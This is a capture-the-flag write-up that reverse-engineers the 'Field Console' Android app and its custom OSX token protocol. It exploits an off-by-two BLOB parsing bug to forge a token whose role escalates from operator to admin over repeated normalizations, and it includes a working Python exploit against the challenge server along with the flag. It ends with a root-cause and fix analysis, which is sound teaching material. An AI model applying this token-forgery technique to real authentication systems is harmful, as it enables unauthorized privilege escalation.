---
title: "Field Console"
description: "Field teams use the Field Console handset app to talk to dispatch nodes on a depot network. Routine (operator) jobs work fine; the maintenance path is meant to be off-limits. We are…"
event: "isfcr"
category: "mobile"
categoryLabel: "Mobile"
tags: ["ISFCR CTF 2026","mobile"]
date: "2026-10-11"
teammate: true
source: "isfcr/writeups/field-console.md"
---

**Category:** Reverse Engineering / Protocol Exploitation
**Artifact:** `field-console.apk`
**Target:** `nc 0.cloud.chals.io 25228`
**Flag:** `isfcr{f13ld_c0ns0l3_t0k3n_b1nd1ng_byp4ss}`

---

## 1. Overview

Field teams use the *Field Console* handset app to talk to dispatch nodes on a
depot network. Routine (operator) jobs work fine; the maintenance path is meant
to be off-limits. We are given the APK and a TCP endpoint. The goal is to get the
node to hand back the flag.

The node speaks a small custom binary token protocol called **OSX**. The
vulnerability is a length bug in the token parser, combined with a *staged*
misparse that lets a token be read as two different roles depending on how many
times it is normalized (reparceled). This bypasses both the admission check and
the "role drift" integrity check.

---

## 2. Static analysis of the APK

The APK is tiny and contains a single `classes.dex`. Decompile with `jadx`:

```bash
unzip field-console.apk -d fc
jadx -d fc/out fc/classes.dex
```

Classes of interest:

```
out/sources/com/srbase/fieldconsole/MainActivity.java
out/sources/com/srbase/fieldconsole/DispatchClient.java
out/sources/com/srbase/fieldconsole/osx/Osx.java
out/sources/com/srbase/fieldconsole/osx/TokenFactory.java
```

### 2.1 Transport — `DispatchClient`

```java
String line = bufferedReader.readLine();          // banner
this.challenge = (int) Long.parseLong(
        line.substring(line.indexOf("challenge=") + 10).trim(), 16);

public String submit(byte[] bArr) {
    // hex-encode, append '\n', send, read one line back
}
```

So the wire protocol is:

```
S: OSX dispatch node. challenge=<hex>
C: <hex-encoded OSX token>\n
S: <one response line>
```

### 2.2 Token format — `Osx`

Magic is `MAGIC = 1330862129 = 0x4F535831` = ASCII `"OSX1"`. A token is a magic
word followed by a sequence of TLV fields:

| Tag  | Name   | Payload                              |
|-----:|--------|--------------------------------------|
| 17   | `I32`  | 4-byte big-endian integer            |
| 34   | `BLOB` | 4-byte length + body                 |
| 51   | `ACL`  | 1 byte role                          |
| 68   | `STR`  | 4-byte length + bytes                |
| 85   | `CAP`  | 4-byte big-endian integer            |

`role(list)` returns the value of the **first** `ACL` field (default `0`).

### 2.3 Token factories — `TokenFactory`

```java
// Routine operator token
operatorToken(i, str):
    [ i32(i), str(str), acl(1) ]          // ROLE_USER = 1

// Maintenance token (private; the app never sends it)
maintenanceToken(i, str):
    [ i32(i), cap(capabilityFor(i)), str(str), acl(7) ]   // ROLE_ADMIN = 7
```

with

```java
capabilityFor(i) = Integer.rotateLeft(i ^ MAGIC, 7);
```

The `MainActivity` shows the handset is deliberately locked:

```java
if (zIsChecked) {
    post("maintenance mode is locked on this handset; sending operator token");
    bArrOperatorToken = TokenFactory.operatorToken(dispatchClient.challenge, str);
} else {
    bArrOperatorToken = TokenFactory.operatorToken(dispatchClient.challenge, str);
}
```

Both branches send the **operator** token, so the maintenance capability is
never used by the handset. That is the first thing to forge.

---

## 3. Probing the node

Sending a literal maintenance token (`acl(7)` + `cap(capabilityFor(challenge))`)
fails, even though the capability is deterministic and we know the challenge:

```
[acl=1]  -> DENY dispatch: insufficient privilege at dispatch
[acl=7]  -> DENY admission: dispatch requires a provisioned operator token
```

Other useful messages discovered while fuzzing:

```
bad i32 / wrong challenge -> DENY admission: token not bound to this challenge
role changes on reparcel -> DENY integrity: role drift detected during normalization
role 7 but no valid cap   -> DENY dispatch: maintenance capability missing or invalid
```

So the node checks, in order:

1. **Binding** — the token's `i32` must equal the challenge it sent.
2. **Normalization + integrity** — it reparcels (`serialize(parse(x))`) and
   refuses if the role drifted (`role(before) != role(after)`).
3. **Admission** — must look like a provisioned operator token (`acl == 1`).
4. **Dispatch** — must be admin (`acl == 7`) **and** carry a valid maintenance
   capability.

Steps 3 and 4 are mutually exclusive for a normal token, which is the whole
point: we need the *same bytes* to be interpreted as `acl=1` for admission, stay
`acl=1` through one normalization (so integrity passes), and then become `acl=7`
on the **next** normalization that the dispatch stage performs.

---

## 4. The bug: `BLOB` consumes `length - 2`

In `Osx.parse`:

```java
case T_BLOB:
    int i4 = i2 + 4;                 // position after tag + length
    int iRi = ri(bArr, i2);          // declared length
    int i5 = iRi - 2;                // <-- BUG: consumes length-2 bytes
    ...
    int i6 = i5 + i4;
    add Field.blob(copyOfRange(bArr, i4, i6));
    i = i6;                          // next tag starts 2 bytes early
```

The parser reads a blob of declared length `L` but consumes only `L - 2` bytes.
The last two bytes of the blob body are therefore reinterpreted as the start of
the next field.

Meanwhile `serialize` writes the *actual* body length and `reparcel` is just:

```java
public static byte[] reparcel(byte[] bArr) { return serialize(parse(bArr)); }
```

Because parse is lossy for blobs, **every normalization shrinks a blob's consumed
region by another 2 bytes**, exposing two more bytes of the blob body to the field
scanner. By arranging the blob body as a sequence of trailing `ACL` pairs
(`0x33 <role>`), we can make the parsed role change by one step per round:

```
raw token                 -> parse #1 : ... blob(...) acl(1) acl(1) acl(7) cap
after 1 normalization     -> parse #2 : ... acl(1) acl(1) acl(7) cap
after 2 normalizations    -> parse #3 : ... acl(7) acl(1) acl(1) cap   <-- admin!
```

`role()` returns the *first* ACL, so:

* parse #1 → role 1 (admission: looks like an operator token) ✅
* parse #2 → role 1 (integrity: role did **not** drift) ✅
* parse #3 → role 7 (dispatch: admin, and the `cap` is present) ✅

This is a *staged* role-drift that hides from the single-step integrity check.

---

## 5. Crafted token

For a challenge `c` (signed 32-bit) and

```
cap = rotateLeft(c XOR 0x4F535831, 7)
```

build the body of a `BLOB` as three trailing ACL pairs. Level 3 must read `7`,
levels 2 and 1 must read `1`:

```
blob body = [ 0x33, 0x07 ] [ 0x33, 0x01 ] [ 0x33, 0x01 ]
             (level 3)      (level 2)      (level 1)
```

Full token:

```
4f535831                                   magic "OSX1"
11 <c:4 bytes>                             i32(challenge)
44 00000008 "operator"                     str(operator id)
22 00000006 33 07 33 01 33 01              blob(6 bytes)
55 <cap:4 bytes>                           cap(capabilityFor(challenge))
```

Hex example (challenge `ab599e5e`):

```
4f535831 11 ab599e5e 44 00000008 6f70657261746f72 22 00000006 330733013301 55 <cap>
```

The node responds:

```
GRANT isfcr{f13ld_c0ns0l3_t0k3n_b1nd1ng_byp4ss}
```

---

## 6. Exploit script

```python
import socket, re, struct

HOST, PORT = "0.cloud.chals.io", 25228
MAGIC = 1330862129          # "OSX1"
T_I32, T_BLOB, T_ACL, T_STR, T_CAP = 17, 34, 51, 68, 85

def rol32(v, n):
    v &= 0xFFFFFFFF
    return ((v << n) | (v >> (32 - n))) & 0xFFFFFFFF

def s32(v):
    v &= 0xFFFFFFFF
    return v - 0x100000000 if v >= 0x80000000 else v

def wi(v):            return struct.pack(">I", v & 0xFFFFFFFF)
def fi(v):            return bytes([T_I32]) + struct.pack(">i", s32(v))
def capf(v):          return bytes([T_CAP]) + struct.pack(">i", s32(v))
def strf(b):          return bytes([T_STR]) + wi(len(b)) + b
def fb(b):            return bytes([T_BLOB]) + wi(len(b)) + b

def build(challenge, name=b"operator"):
    cap = rol32((challenge & 0xFFFFFFFF) ^ MAGIC, 7)
    # three ACL pairs, read right-to-left as levels 1,2,3
    blob = bytes([T_ACL, 0x07, T_ACL, 0x01, T_ACL, 0x01])
    tok = (wi(MAGIC) + fi(challenge) + strf(name) + fb(blob) + capf(cap))
    return tok

s = socket.create_connection((HOST, PORT), timeout=10)
f = s.makefile("rwb")
banner = f.readline().decode().strip()
challenge = s32(int(re.search(r"challenge=([0-9a-fA-F]+)", banner).group(1), 16))

tok = build(challenge)
f.write(tok.hex().encode() + b"\n"); f.flush()
print(f.readline().decode().strip())
```

Output:

```
GRANT isfcr{f13ld_c0ns0l3_t0k3n_b1nd1ng_byp4ss}
```

---

## 7. Root cause & fix

* **Off-by-two in `Osx.parse` (`BLOB`)**: `i5 = iRi - 2` must be `i5 = iRi`.
  The parser consumed two fewer bytes than the declared length, letting blob
  contents leak into the field stream. `serialize`/`parse` are not inverses, so
  repeated `reparcel` walks a field boundary backwards through the blob body.
* **Staged integrity check**: comparing the role before/after a *single*
  normalization is insufficient when each normalization shifts the boundary by
  2 bytes. Either make parse/serialize idempotent (fix the bug) or verify that
  `reparcel(reparcel(x)) == reparcel(x)` and that roles are stable *until a fixed
  point*.
* **Trusting a self-describing token for privilege**: the role and the
  maintenance capability are attacker-controlled and derived only from the
  public challenge. Privilege should be bound to a server-side authenticated
  credential, not a forgeable, client-constructed token.
